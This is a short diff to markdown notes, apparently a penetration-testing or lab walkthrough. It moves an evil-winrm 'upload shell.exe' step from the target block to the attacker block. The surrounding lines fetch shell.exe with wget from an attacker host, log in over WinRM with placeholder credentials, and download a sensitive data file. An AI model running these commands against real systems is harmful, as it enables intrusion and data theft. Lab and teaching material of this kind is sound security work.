@@ -15,10 +15,10 @@ wget http://10.10.10.10:8000/shell.exe -O shell.exe
 From the attacking device:
 ```sh
 evil-winrm -i 10.10.10.11 -u MyUsername -p MyPassword
+upload shell.exe
 ```
 
 From the target:
 ```sh
-upload shell.exe
 download sensitive-data.txt
 ```
